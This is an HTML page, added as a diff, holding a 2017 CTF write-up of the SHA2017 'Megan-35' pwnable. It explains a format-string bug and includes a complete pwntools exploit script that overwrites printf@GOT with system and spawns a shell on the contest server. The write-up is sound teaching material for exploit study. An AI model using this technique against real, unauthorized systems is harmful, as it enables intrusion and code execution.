@@ -1,0 +1,353 @@
+<!DOCTYPE html>
+<html lang="en-us">
+	<head>
+    <meta charset="utf-8">
+<meta http-equiv="X-UA-Compatible" content="IE=edge,chrome=1">
+<meta name="viewport" content="width=device-width, initial-scale=1">
+<meta name="author" content="hgarrereyn">
+<meta name="description" content="CTF writeups">
+<meta name="generator" content="Hugo 0.25.1" />
+<title>SHA2017 - Megan-35 (200pt)</title>
+<link rel="shortcut icon" href="https://ctf.harrisongreen.me/images/favicon.png">
+<link rel="stylesheet" href="https://ctf.harrisongreen.me/css/style.css">
+<link rel="stylesheet" href="https://ctf.harrisongreen.me/css/highlight.css">
+
+
+
+<link rel="stylesheet" href="https://maxcdn.bootstrapcdn.com/font-awesome/latest/css/font-awesome.min.css">
+
+
+
+
+<meta property="og:title" content="SHA2017 - Megan-35 (200pt)" />
+<meta property="og:description" content="Format string attack" />
+<meta property="og:type" content="article" />
+<meta property="og:url" content="https://ctf.harrisongreen.me/2017/sha2017/megan-35/" />
+
+
+
+<meta property="article:published_time" content="2017-08-06T00:00:00&#43;00:00"/>
+<meta property="article:modified_time" content="2017-08-06T00:00:00&#43;00:00"/>
+
+
+
+
+
+
+
+
+
+
+
+
+
+<meta itemprop="name" content="SHA2017 - Megan-35 (200pt)">
+<meta itemprop="description" content="Format string attack">
+
+
+<meta itemprop="dateModified" content="2017-08-06T00:00:00&#43;00:00" />
+<meta itemprop="wordCount" content="520">
+
+
+
+<meta itemprop="keywords" content="exploit," />
+
+
+
+  <meta name="twitter:card" content="summary"/>
+
+
+
+<meta name="twitter:text:title" content="SHA2017 - Megan-35 (200pt)"/>
+<meta name="twitter:title" content="SHA2017 - Megan-35 (200pt)"/>
+<meta name="twitter:description" content="Format string attack"/>
+
+
+
+    </head>
+<body>
+    <nav class="main-nav">
+	
+		<a href='https://ctf.harrisongreen.me'> <span class="arrow">←</span>Home</a>
+	
+
+	
+
+	
+</nav>
+
+    <section id="wrapper">
+        
+        
+<article class="post">
+    <header>
+        <h1>SHA2017 - Megan-35 (200pt)</h1>
+        <h2 class="headline">
+        August 6, 2017
+        <br>
+        
+        
+            
+                <a href="https://ctf.harrisongreen.me/tags/exploit">exploit</a>
+            
+        
+        
+        </h2>
+    </header>
+    <section id="post-body">
+        
+
+<h1 id="megan-35-200pt">Megan-35 (200pt)</h1>
+
+<p><strong><code>Pwnable</code></strong></p>
+
+<p><strong>Description:</strong> We created our own Megan-35 decoding tool, feel free to test it. System is running Ubuntu 16.04, ASLR is disabled.</p>
+
+<p><strong>Files:</strong></p>
+
+<ul>
+<li><a href="/code/2017/SHA2017/megan-35/megan-35">megan-35</a></li>
+<li><a href="/code/2017/SHA2017/megan-35/libc.so.6">libc.so.6</a></li>
+<li>Exploit script: <a href="/code/2017/SHA2017/megan-35/solveMegan35.py">solveMegan35.py</a></li>
+</ul>
+
+<h1 id="solution">Solution</h1>
+
+<p>This was a pretty standard format string attack. The approach I used was to perform four writes at once to do the following:
+- replace <code>printf@GOT</code> with <code>&lt;system&gt;</code>
+- replace the saved return pointer with <code>&lt;main&gt;</code></p>
+
+<p>Then the program would effectively loop and call <code>system(user_input)</code> instead of <code>printf(user_input)</code>.</p>
+
+<h1 id="vulnerable-code">Vulnerable Code</h1>
+
+<p>The actual vulnerability occured here near the end of <code>&lt;main&gt;</code>:</p>
+
+<pre><code class="language-x86asm">             __pic:
+0804854c         pop        edx
+0804854d         pop        ecx
+0804854e         push       eax                                                 ; argument &quot;src&quot; for method j_strcpy
+0804854f         push       ebx                                                 ; argument &quot;dst&quot; for method j_strcpy
+08048550         call       j_strcpy
+08048555         mov        dword [esp+0x238+var_238], ebx                      ; argument &quot;format&quot; for method j_printf
+08048558         call       j_printf
+0804855d         mov        edx, dword [ebp+var_1C]
+08048560         xor        edx, dword [gs:0x14]
+08048567         je         loc_804856e
+</code></pre>
+
+<p>The only gotcha was that the input was decoded using Megan-35 before it was printed. It turns out that Megan-35 is just Base64 with a different charset (I really have no idea why it exists).</p>
+
+<p>Anyways, I was able to use the following python script to encode text:</p>
+
+<pre><code class="language-py">import base64
+
+char_megan35 = &quot;3GHIJKLMNOPQRSTUb=cdefghijklmnopWXYZ/12+406789VaqrstuvwxyzABCDEF5&quot;
+char_base64 = &quot;ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789+/=&quot;
+char_map = dict(zip(char_base64, char_megan35))
+
+def m35encode(s):
+    b = base64.b64encode(s)
+    return ''.join([char_map[x] for x in b])
+</code></pre>
+
+<h1 id="crafting-the-exploit">Crafting the Exploit</h1>
+
+<p>Using gdb to examine memory, I could see that the encoded text was stored on the stack starting at offset <code>7</code>. In order to maintain the address pointers, I sent them as plaintext. However, the actual format string attack had to be encoded with Megan-35.</p>
+
+<p>Since ASLR was disabled, it was easy to leak a libc address and calculate the address of system using the provided libc.so binary.</p>
+
+<p>Using the same method, you could leak a stack pointer and calculate the offset to the return address.</p>
+
+<p>Once you had both these values, you could craft a 4 part format string attack (writing two bytes with <code>$hn</code>) and get a shell.</p>
+
+<h1 id="script">Script</h1>
+
+<p><a href="/code/2017/SHA2017/megan-35/solveMegan35.py">view raw</a></p>
+
+<pre><code class="language-py"># by hgarrereyn
+
+from pwn import *
+
+import base64
+import binascii
+
+char_megan35 = &quot;3GHIJKLMNOPQRSTUb=cdefghijklmnopWXYZ/12+406789VaqrstuvwxyzABCDEF5&quot;
+char_base64 = &quot;ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789+/=&quot;
+char_map = dict(zip(char_base64, char_megan35))
+
+def m35encode(s):
+    b = base64.b64encode(s)
+    return ''.join([char_map[x] for x in b])
+
+
+def r():
+    print sock.recvline()
+
+# ---
+
+sock = remote('megan35.stillhackinganyway.nl', 3535)
+
+sock.recvline()
+
+# Overwrite printf@GOT with &lt;system&gt;
+# system = 0xf7e50da0
+system = 0xf7e53940
+system_low = (system &amp; 0xFFFF)
+system_high = (system &amp; 0xFFFF0000) &gt;&gt; 16
+
+main = 0x080484ea
+main_low = (main &amp; 0xFFFF)
+main_high = (main &amp; 0xFFFF0000) &gt;&gt; 16
+
+printf_got = 0x0804a00c
+
+buff = ''
+
+buff += '\x08\x04\xa0\x0c'[::-1] # printf@GOT
+buff += '\x08\x04\xa0\x0e'[::-1] # printf@GOT + 2
+
+buff += '\xff\xff\xdd\xcc'[::-1] # saved return address
+buff += '\xff\xff\xdd\xce'[::-1] # saved return address + 2
+
+buff_e = '' # stuff that needs to be encoded
+
+# These need to be ordered from lowest to highest write value
+buff_e += ('%' + str(main_high - 12) + 'x%10$hn')
+buff_e += ('%' + str(system_low - main_high) + 'x%7$hn')
+buff_e += ('%' + str(main_low - system_low) + 'x%9$hn')
+buff_e += ('%' + str(system_high - main_low) + 'x%8$hn')
+
+buff += m35encode(buff_e)
+
+sock.sendline(buff)
+
+c = sock.clean(timeout=1)
+
+sock.sendline(m35encode('sh'))
+
+print &quot;Have a shell:&quot;
+
+sock.interactive()
+</code></pre>
+
+    </section>
+</article>
+
+<footer id="post-meta" class="clearfix">
+    <a href="https://twitter.com/hgarrereyn">
+    <img class="avatar" src="https://ctf.harrisongreen.me/images/avatar.png">
+    <div>
+        <span class="dark">hgarrereyn</span>
+        <span></span>
+    </div>
+    </a>
+    <section id="sharing">
+        <a class="twitter" href="https://twitter.com/intent/tweet?text=https%3a%2f%2fctf.harrisongreen.me%2f2017%2fsha2017%2fmegan-35%2f - SHA2017%20-%20Megan-35%20%28200pt%29 by @hgarrereyn"><span class="icon-twitter"> tweet</span></a>
+
+<a class="facebook" href="#" onclick="
+    window.open(
+      'https://www.facebook.com/sharer/sharer.php?u='+encodeURIComponent(location.href),
+      'facebook-share-dialog',
+      'width=626,height=436');
+    return false;"><span class="icon-facebook-rect"> Share</span>
+</a>
+
+    </section>
+</footer>
+
+<div id="disqus_thread"></div>
+<script>
+    var disqus_config = function () {
+    
+    
+    
+    };
+    (function() {
+        if (["localhost", "127.0.0.1"].indexOf(window.location.hostname) != -1) {
+            document.getElementById('disqus_thread').innerHTML = 'Disqus comments not available by default when the website is previewed locally.';
+            return;
+        }
+        var d = document, s = d.createElement('script'); s.async = true;
+        s.src = '//' + "hgar" + '.disqus.com/embed.js';
+        s.setAttribute('data-timestamp', +new Date());
+        (d.head || d.body).appendChild(s);
+    })();
+</script>
+<noscript>Please enable JavaScript to view the <a href="http://disqus.com/?ref_noscript">comments powered by Disqus.</a></noscript>
+<a href="http://disqus.com" class="dsq-brlink">comments powered by <span class="logo-disqus">Disqus</span></a>
+
+<ul id="post-list" class="archive readmore">
+    <h3>Read more</h3>
+
+    
+    
+    
+        <li>
+            <a href="/2018/uiuctf/galactic-brainfuck/">UIUCTF 2018 - Galactic Brain[fuck] (300pt)<aside class="dates">Apr 8 2018</aside></a>
+        </li>
+    
+        <li>
+            <a href="/2018/uiuctf/how2heap/">UIUCTF 2018 - how2heap (300pt)<aside class="dates">Apr 8 2018</aside></a>
+        </li>
+    
+        <li>
+            <a href="/2017/csaw/scv/">CSAW - SCV (100pt)<aside class="dates">Sep 19 2017</aside></a>
+        </li>
+    
+        <li>
+            <a href="/2017/sha2017/stolen-bitcoins/">SHA2017 - Stolen Bitcoins (300pt)<aside class="dates">Aug 6 2017</aside></a>
+        </li>
+    
+        <li>
+            <a href="/2017/meepwn/bs/">MeePwn 2017 - bs (100pt)<aside class="dates">Jul 16 2017</aside></a>
+        </li>
+    
+</ul>
+
+
+
+        <footer id="footer">
+    
+        <div id="social">
+
+	
+	
+    <a class="symbol" href="https://www.github.com/hgarrereyn">
+        <i class="fa fa-github"></i>
+    </a>
+    
+
+
+</div>
+
+    
+    <p class="small">
+    
+        © Copyright 2018 Harrison Green
+    
+    </p>
+</footer>
+
+    </section>
+    
+<script src="https://ctf.harrisongreen.me/js/main.js"></script>
+<script src="https://ctf.harrisongreen.me/js/highlight.pack.js"></script>
+<script>hljs.initHighlightingOnLoad();</script>
+
+
+
+
+<script>
+(function(i,s,o,g,r,a,m){i['GoogleAnalyticsObject']=r;i[r]=i[r]||function(){
+(i[r].q=i[r].q||[]).push(arguments)},i[r].l=1*new Date();a=s.createElement(o),
+m=s.getElementsByTagName(o)[0];a.async=1;a.src=g;m.parentNode.insertBefore(a,m)
+})(window,document,'script','https://www.google-analytics.com/analytics.js','ga');
+
+ga('create', 'UA-104192995-1', 'auto');
+ga('send', 'pageview');
+</script>
+
+
+</body>
+</html>
